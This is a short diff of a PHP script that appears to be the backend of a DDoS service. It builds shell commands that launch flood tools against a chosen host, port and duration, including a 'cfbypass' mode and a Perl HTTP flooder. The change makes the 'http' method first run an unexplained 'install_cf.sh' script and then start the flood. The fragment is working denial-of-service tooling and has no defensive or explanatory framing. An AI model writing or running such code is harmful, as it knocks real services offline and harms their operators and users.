@@ -131,7 +131,7 @@ if ($method == "http" or $method == "cfbypass") {
         $command = "screen -dm $directory/ddoser run --url=$host:$port -w 500 -d " . $time . "s -f $directory/https.txt";
     }
     if ($method == "http") {
-        $command = "screen -dm perl $directory/http.pl $host $port 50 500 $time";
+        $command = "bash install_cf.sh && screen -dm perl $directory/http.pl $host $port 50 500 $time";
     }
 }
 if ($method == "stop") {
